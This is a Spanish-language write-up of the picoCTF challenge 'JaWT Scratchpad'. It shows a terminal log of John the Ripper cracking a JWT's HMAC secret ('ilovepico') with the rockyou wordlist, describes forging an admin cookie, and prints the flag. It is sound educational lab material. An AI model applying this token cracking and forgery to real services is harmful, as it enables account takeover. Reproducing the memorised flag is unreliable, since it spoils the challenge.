# -   JaWT Scratchpad


## Descripción
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/63090/` or http://jupiter.challenges.picoctf.org:63090

## Pistas
- What is that cookie?
- Have you heard of JWT?

## Solución

- Entramos a la pagina web:    http://jupiter.challenges.picoctf.org:63090
- Este desafío es sobre Json Web Tokens. Al visitar el enlace, vemos una página que solicita el nombre de usuario. Al proporcionar un nombre de usuario que no sea administrador, se nos proporciona un área de texto para escribir. Se crea una nueva cookie llamada 'jwt'. El nombre de usuario que proporcioné fue 'karen'.
- El token Jwt en la cookie se usa para firmar. El token se puede inspeccionar en: [JWT debugger](https://jwt.io/#debugger) .
- La carga útil consiste solo en el usuario. Tenemos que cambiar el usuario a admin para acceder a la página y obtener la bandera. Pero cuando cambiamos el valor sin conocer la clave secreta, la firma cambiará y nuestro token jwt dejará de ser válido. Por lo tanto, necesitamos encontrar la clave antes de poder cambiar el token.
- Hay una referencia a John en la página web proporcionada que da una pista de que también podríamos intentar un ataque de diccionario en la clave secreta. La lista de palabras utilizada para el ataque es rockyou.txt (una lista de palabras popular) .
- Se aplica fuerza bruta al token 
- Se crea un archivo de texto, pegamos el JWT original en él y se guarda
``` bash
┌──(kali㉿kali)-[~]
└─$ ls
Descargas  Documentos  Escritorio  flagout.txt  hack-notas  Imágenes  Música  Plantillas  Público  Vídeos
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ cd Documentos                                                                                             
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documentos]
└─$ ls           
 notas-hacking  'Primer Parcial '   token
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documentos]
└─$ cat token    
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiS2FyZW4ifQ.aDCJXUpv4v-5d2B0J1kH3_baTPHnGttzgwcpLiExA70
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documentos]
└─$ john
Created directory: /home/kali/.john
John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 SSE2 AC]
Copyright (c) 1996-2021 by Solar Designer and others
Homepage: https://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]

Use --help to list all available options.
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documentos]
└─$ john token
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
0g 0:00:00:04  3/3 0g/s 854562p/s 854562c/s 854562C/s cuciness..1blomm
0g 0:00:00:09  3/3 0g/s 1627Kp/s 1627Kc/s 1627KC/s r138550..plyd
0g 0:00:01:36  3/3 0g/s 2241Kp/s 2241Kc/s 2241KC/s uap..30068c
0g 0:00:01:37  3/3 0g/s 2242Kp/s 2242Kc/s 2242KC/s 32ad6d..32a4kh
0g 0:00:01:37  3/3 0g/s 2242Kp/s 2242Kc/s 2242KC/s 3g1s1a..3g1m06
Session aborted
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documentos]
└─$ sudo gzip -d rockyou.txt.gz
[sudo] contraseña para kali: 
gzip: rockyou.txt.gz: No such file or directory
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documentos]
└─$ cd /usr/share/wordlists 
                                                                                                                                                            
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ ls -lah
total 51M
drwxr-xr-x   2 root root 4.0K ene 31 17:38 .
drwxr-xr-x 341 root root  12K feb  7 19:12 ..
lrwxrwxrwx   1 root root   26 ene 31 17:38 amass -> /usr/share/amass/wordlists
lrwxrwxrwx   1 root root   25 ene 31 17:38 dirb -> /usr/share/dirb/wordlists
lrwxrwxrwx   1 root root   30 ene 31 17:38 dirbuster -> /usr/share/dirbuster/wordlists
lrwxrwxrwx   1 root root   41 ene 31 17:38 fasttrack.txt -> /usr/share/set/src/fasttrack/wordlist.txt
lrwxrwxrwx   1 root root   45 ene 31 17:38 fern-wifi -> /usr/share/fern-wifi-cracker/extras/wordlists
lrwxrwxrwx   1 root root   28 ene 31 17:38 john.lst -> /usr/share/john/password.lst
lrwxrwxrwx   1 root root   27 ene 31 17:38 legion -> /usr/share/legion/wordlists
lrwxrwxrwx   1 root root   46 ene 31 17:38 metasploit -> /usr/share/metasploit-framework/data/wordlists
lrwxrwxrwx   1 root root   41 ene 31 17:38 nmap.lst -> /usr/share/nmap/nselib/data/passwords.lst
-rw-r--r--   1 root root  51M may 31  2022 rockyou.txt.gz
lrwxrwxrwx   1 root root   39 ene 31 17:38 sqlmap.txt -> /usr/share/sqlmap/data/txt/wordlist.txt
lrwxrwxrwx   1 root root   25 ene 31 17:38 wfuzz -> /usr/share/wfuzz/wordlist
lrwxrwxrwx   1 root root   37 ene 31 17:38 wifite.txt -> /usr/share/dict/wordlist-probable.txt
                                                                                                                                                            
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ sudo gzip -d rockyou.txt.gz
                                                                                                                                                            
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ ls -lah                    
total 134M
drwxr-xr-x   2 root root 4.0K mar 14 12:58 .
drwxr-xr-x 341 root root  12K feb  7 19:12 ..
lrwxrwxrwx   1 root root   26 ene 31 17:38 amass -> /usr/share/amass/wordlists
lrwxrwxrwx   1 root root   25 ene 31 17:38 dirb -> /usr/share/dirb/wordlists
lrwxrwxrwx   1 root root   30 ene 31 17:38 dirbuster -> /usr/share/dirbuster/wordlists
lrwxrwxrwx   1 root root   41 ene 31 17:38 fasttrack.txt -> /usr/share/set/src/fasttrack/wordlist.txt
lrwxrwxrwx   1 root root   45 ene 31 17:38 fern-wifi -> /usr/share/fern-wifi-cracker/extras/wordlists
lrwxrwxrwx   1 root root   28 ene 31 17:38 john.lst -> /usr/share/john/password.lst
lrwxrwxrwx   1 root root   27 ene 31 17:38 legion -> /usr/share/legion/wordlists
lrwxrwxrwx   1 root root   46 ene 31 17:38 metasploit -> /usr/share/metasploit-framework/data/wordlists
lrwxrwxrwx   1 root root   41 ene 31 17:38 nmap.lst -> /usr/share/nmap/nselib/data/passwords.lst
-rw-r--r--   1 root root 134M may 31  2022 rockyou.txt
lrwxrwxrwx   1 root root   39 ene 31 17:38 sqlmap.txt -> /usr/share/sqlmap/data/txt/wordlist.txt
lrwxrwxrwx   1 root root   25 ene 31 17:38 wfuzz -> /usr/share/wfuzz/wordlist
lrwxrwxrwx   1 root root   37 ene 31 17:38 wifite.txt -> /usr/share/dict/wordlist-probable.txt
                                                                                                                                                            
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ head rockyou.txt 
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
                                                                                                                                                            
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ wc rockyou.txt 
 14344392  14442062 139921507 rockyou.txt
                                                                                                                                                            
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ cd                     
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ pwd    
/home/kali
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ ls     
Descargas  Documentos  Escritorio  flagout.txt  hack-notas  Imágenes  Música  Plantillas  Público  Vídeos
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ cd Documentos 
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documentos]
└─$ john token
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
0g 0:00:00:08  3/3 0g/s 1725Kp/s 1725Kc/s 1725KC/s revcit..ricc3s
Session aborted
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documentos]
└─$ john token -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:02 DONE (2023-03-14 13:03) 0.3759g/s 2780Kp/s 2780Kc/s 2780KC/s iloverob4live345..ilovepatri
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documentos]
└─$ 

```

- Se obtiene el secreto utilizado: 'ilovepico'
- Volvemos a utilizar el [depurador JWT](https://jwt.io/#debugger) . Cambiamos el usuario a administrador y luego actualice el secreto con la clave encontrada. Esto le dará un nuevo JWT. 
- Se cambia el valor de la cookie al nuevo JWT y se actualiza la página 
- Se obtirne la bandera en el área de texto

## Bandera
picoCTF{jawt_was_just_what_you_thought_f859ab2f}

## Referencias
- [JSON][https://jwt.io/]

